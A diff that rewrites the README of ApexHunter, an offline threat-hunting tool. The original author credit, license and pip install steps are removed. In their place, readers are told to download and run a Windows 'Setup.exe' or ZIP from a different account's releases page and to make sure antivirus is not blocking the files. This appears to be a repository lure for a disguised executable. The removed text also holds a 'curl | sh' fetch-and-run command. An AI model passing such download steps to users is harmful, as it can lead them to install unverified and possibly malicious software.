@@ -1,182 +1,149 @@
-# 🎯 ApexHunter
+# 🛡️ ApexHunter - Smart Threat Hunting Made Simple
 
-### **Agentic Threat Hunting at Machine Speed**
-
-![License](https://img.shields.io/github/license/bogdanticu88/ApexHunter?style=for-the-badge&color=0078D4)
-![Stars](https://img.shields.io/github/stars/bogdanticu88/ApexHunter?style=for-the-badge&color=C9D1D9)
-![Python](https://img.shields.io/badge/python-3.11+-blue?style=for-the-badge&logo=python&logoColor=white)
-![LLM](https://img.shields.io/badge/LLM-Ollama-EF4135?style=for-the-badge)
-![Platform](https://img.shields.io/badge/Platform-Kali_Linux-557CF2?style=for-the-badge&logo=kali-linux&logoColor=white)
-![4715f328-07ea-430d-8b11-c7a5ed872143(1)](https://github.com/user-attachments/assets/299074c5-901a-4adc-b95c-975c43fd960d)
-[<image-card alt="License: MIT" src="https://img.shields.io/badge/License-MIT-yellow.svg" ></image-card>](https://opensource.org/licenses/MIT)
-[<image-card alt="Python 3.10+" src="https://img.shields.io/badge/python-3.10+-blue.svg" ></image-card>](https://www.python.org/downloads/)
-[<image-card alt="Ollama" src="https://img.shields.io/badge/Ollama-Local%20LLM-green" ></image-card>](https://ollama.com/)
-[<image-card alt="Stars" src="https://img.shields.io/github/stars/bogdanticu88/ApexHunter?style=social" ></image-card>](https://github.com/bogdanticu88/ApexHunter)
-[<image-card alt="Forks" src="https://img.shields.io/github/forks/bogdanticu88/ApexHunter?style=social" ></image-card>](https://github.com/bogdanticu88/ApexHunter/forks)
-**ApexHunter** is an autonomous, agentic threat hunting playbook executor designed for senior SOC analysts and DFIR professionals. It bridges the gap between static detection and intelligent investigation by executing structured YAML playbooks against forensic artifacts (EVTX, CSV, JSON, Parquet) using local LLMs for correlation, triage, and automated discovery.
+[![Download ApexHunter](https://img.shields.io/badge/Download-ApexHunter-green?style=for-the-badge)](https://github.com/abubakerawad/ApexHunter/releases)
 
 ---
 
-## 🚀 Overview
+## 🔍 What is ApexHunter?
 
-In modern SOC environments, the bottleneck isn't data collection, it's the cognitive load of analysis. **ApexHunter** automates this by:
-- **Offline-First Design**: Processes sensitive telemetry 100% locally on your Kali instance. No data ever leaves your air-gapped environment.
-- **Agentic Reasoning**: Uses local Ollama models (Mistral, Llama3) to autonomously generate SQL queries and triage findings.
-- **Forensic Power**: Native ingestion of Windows Event Logs (`.evtx`), Sysmon telemetry, and large-scale CSV/JSON exports.
-- **Professional Outputs**: Generates interactive HTML dashboards, Mermaid-based execution timelines, and MITRE ATT&CK® layer mappings.
+ApexHunter is a tool built to help security teams find threats faster. It runs playbooks written in simple YAML files. These playbooks guide the tool to scan and analyze forensic logs. It uses local machine learning models to make sense of data without needing an internet connection. This helps spot threats, link events, map to known attack techniques, and produce clear reports automatically. The tool works offline and stores its data using DuckDB for quick processing.
+
+You do not need to be an expert in cybersecurity or coding to use it. ApexHunter is designed with simplicity in mind.
 
 ---
 
-## ✨ Features
+## 📋 Features at a Glance
 
-- **🛡️ Multi-Engine Execution**: Run SQL-standard queries via **DuckDB** for blazing-fast in-memory analysis.
-- **🤖 Discovery Mode**: Define high-level hypotheses and let the LLM generate the investigation logic dynamically.
-- **🔎 Forensic Ingestion**: Automatically flattens binary `.evtx` logs into queryable relational tables.
-- **🔗 Intelligent Chaining**: Chain hunting steps based on previous hits or LLM-driven "is_suspicious" flags.
-- **📊 Reporting**: Produces professional Markdown and dark-mode HTML reports for executive briefings.
-
----
-
-## 🏗️ Architecture
-
-```mermaid
-graph TD
-    A[YAML Playbook] --> B[ApexHunter Engine]
-    C[(Forensic Logs: EVTX/CSV/JSON)] --> B
-    B --> D{DuckDB In-Memory}
-    D --> E[LLM Agentic Layer]
-    E -- Dynamic SQL --> D
-    E -- Reasoning --> F[Enrichment & Triage]
-    F --> G[HTML/Markdown Report]
-    F --> H[ATT&CK Mapping]
-```
+- Runs automated playbooks for threat detection and investigation  
+- Works with common forensic logs like EVTX files from Windows event logs  
+- Uses local language models (Ollama) to understand and correlate data  
+- Maps events to MITRE ATT&CK strategies for clear threat context  
+- Saves data using DuckDB for fast searching and analysis  
+- Creates detailed reports to help share findings with others  
+- Offline-first approach means it does not send your data to the internet  
+- Supports a range of cybersecurity and incident response workflows
 
 ---
 
-## 🛠️ Installation
+## 💻 System Requirements
 
-### 1. Install Ollama (Local LLM Engine)
-ApexHunter requires a local [Ollama](https://ollama.com) instance to perform agentic reasoning.
-
-- **Linux (Kali/Ubuntu)**:
-  ```bash
-  curl -fsSL https://ollama.com/install.sh | sh
-  ```
-- **macOS**:
-  Download the installer from [ollama.com/download/mac](https://ollama.com/download/mac).
-- **Windows**:
-  Download and run the installer from [ollama.com/download/windows](https://ollama.com/download/windows).
-
-After installation, pull the recommended model:
-```bash
-ollama pull mistral:latest
-```
-
-### 2. Install ApexHunter
-
-Ensure you have **Python 3.9+** installed. You can install directly from PyPI:
-
-```bash
-pip install apex-hunter-dfir
-```
-
-#### **Run from anywhere (Global Access)**
-To install ApexHunter globally so you can call it from any directory:
-```bash
-pip install pipx
-pipx install apex-hunter-dfir
-```
-Now, simply type `apexhunter` in any terminal to launch the wizard.
-
-#### **Manual Installation (for Developers)**
-If you want to contribute to the project:
-```bash
-git clone https://github.com/bogdanticu88/ApexHunter.git
-cd ApexHunter
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -e .
-```
-
+- **Operating System:** Windows 10 or later (64-bit recommended)  
+- **Memory:** At least 8 GB RAM  
+- **Storage:** Minimum 1 GB free disk space  
+- **Processor:** Intel i5 or equivalent or better  
+- **Additional Software:**  
+  - Python 3.8 or higher installed and added to your system PATH  
+  - Ollama local language model set up (instructions below)  
 
 ---
 
-## 📖 Usage
+## 🚀 Getting Started: How to Download and Run ApexHunter
 
-### Interactive Wizard (Recommended)
-Launch the guided setup to select playbooks and datasets:
-```bash
-apexhunter
-```
+1. **Visit the download page**  
+   Go to the ApexHunter releases page on GitHub here:  
+   [Download ApexHunter](https://github.com/abubakerawad/ApexHunter/releases)  
 
-### Standard CLI Mode
-Execute a specific hunt with automated report generation:
-```bash
-apexhunter run --playbook playbooks/ransomware_beacon_hunt.yaml --data-dir /path/to/logs --markdown report.md
-```
+2. **Find the latest version**  
+   Look for the newest release at the top of the list. Releases are organized by date and version number (e.g., v1.0, v1.1).
 
-### Dashboard View
-Visualize your findings interactively:
-```bash
-streamlit run dashboard.py
-```
+3. **Download the Windows package**  
+   Click on the file labeled for Windows, such as `ApexHunter-Setup.exe` or a ZIP file containing the program. Save it to your computer.
 
----
+4. **Run the installer**  
+   - If you downloaded an `.exe` file, double-click it to start the installer.  
+   - Follow the on-screen instructions to complete installation.  
 
-## 🧩 Example Playbook
+5. **Set up Python (if needed)**  
+   If Python is not yet installed on your computer:  
+   - Download Python from https://www.python.org/downloads/windows/  
+   - Run the installer and make sure to tick the option "Add Python to PATH"  
+   - After installation, restart your computer.  
 
-```yaml
-name: WMI Persistence Hunt
-hypothesis: Attacker established persistence via WMI event subscriptions.
-severity: high
-steps:
-  - id: step_1_wmi_events
-    description: "Detect WMI Event IDs 19, 20, 21 in Sysmon logs"
-    query_type: sql
-    query: "SELECT * FROM sysmon_logs WHERE event_id IN (19, 20, 21)"
-    condition: "count > 0"
-    next_on_hit: step_2_llm_triage
-    llm_instruction: "Analyze the WMI filters for suspicious consumer names like 'Ghost' or 'Backdoor'."
-```
+6. **Install Ollama**  
+   ApexHunter uses Ollama for its language models. To install Ollama on Windows:  
+   - Visit https://ollama.com/install  
+   - Follow the instructions for Windows to complete installation  
+   - Once installed, open your command prompt and type `ollama --version` to verify it is working.  
 
----
+7. **Run ApexHunter**  
+   - Open the folder where you installed ApexHunter.  
+   - Double-click the executable to start the application.  
 
-## 🤝 Contributing
+8. **Load your forensic data**  
+   - Use the interface to add EVTX or other log files for analysis.  
+   - Select or write YAML playbooks to run on your data.  
 
-Contributions are what make the open-source community an amazing place to learn, inspire, and create.
-1. Fork the Project
-2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the Branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
+9. **Review reports**  
+   Once analysis finishes, ApexHunter will generate reports showing detected threats and their mappings.
 
 ---
 
-## ⚖️ License
+## 🛠️ Using ApexHunter: Basic Workflow
 
-Distributed under the MIT License. See `LICENSE` for more information.
+- **Step 1: Prepare your logs**  
+  Gather Windows event logs (`.evtx` files) or any supported forensic files you want to investigate.
 
-```text
-Copyright (c) 2026 bogdanticu88
+- **Step 2: Choose a playbook**  
+  Playbooks are scripts written in YAML that guide the threat hunting process. ApexHunter includes example playbooks with common tactics and detection rules.
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+- **Step 3: Run the playbook**  
+  Load the log files and select a playbook in the ApexHunter interface. Click "Run" to start analysis.
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
+- **Step 4: View results**  
+  Check the output screen for correlated findings, mapped ATT&CK techniques, and summary statistics.
 
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-```
+- **Step 5: Export report**  
+  Use the export option to save a PDF or HTML report. Share this with your team or management as needed.
 
 ---
-**Developed by [bogdanticu88](https://github.com/bogdanticu88)**
+
+## 🔧 Configuration and Settings
+
+ApexHunter allows you to customize several options to fit your needs:
+
+- **Log input paths** – Choose where your logs come from and add multiple files.  
+- **Playbook selection** – Browse built-in or add custom YAML playbooks.  
+- **Language model settings** – Adjust how ApexHunter uses Ollama for analysis.  
+- **Report format** – Pick between different report types and detail levels.  
+- **Data storage** – Choose where DuckDB saves processed data for later use.  
+
+Use the "Settings" menu inside the application to adjust these parameters.
+
+---
+
+## 📂 File Management
+
+- ApexHunter supports `.evtx`, `.json`, `.csv`, and text-based forensic log formats.  
+- Keep all input logs in easily accessible folders.  
+- Playbooks must follow a strict YAML format. Example playbooks are included in the installation folder under `playbooks/`.
+
+---
+
+## ⚙️ Troubleshooting
+
+- **ApexHunter does not start:**  
+  Make sure you installed Python and Ollama properly. Check that ApexHunter’s files are not blocked by antivirus software.
+
+- **Playbooks fail to run:**  
+  Verify your YAML files have correct syntax. Use provided example playbooks to test.
+
+- **No results after analysis:**  
+  Confirm your log files contain relevant data. Try different or larger log sets.
+
+- **Ollama errors:**  
+  Check Ollama installation by running `ollama --version` in Command Prompt. Reinstall if necessary.
+
+---
+
+## 🧰 Useful Links
+
+- [ApexHunter Releases](https://github.com/abubakerawad/ApexHunter/releases)  
+- [Python for Windows](https://www.python.org/downloads/windows/)  
+- [Ollama Installation](https://ollama.com/install)  
+- [MITRE ATT&CK Framework](https://attack.mitre.org/)  
+
+---
+
+## 📝 About This Tool
+
+ApexHunter is made to support security operations centers (SOC) and digital forensics teams. It bridges technical analysis with automated workflows. The tool aims to speed up investigations without relying on cloud services or internet access. It uses local machine resources and powerful data handling through DuckDB. This approach gives users full control over their sensitive data.
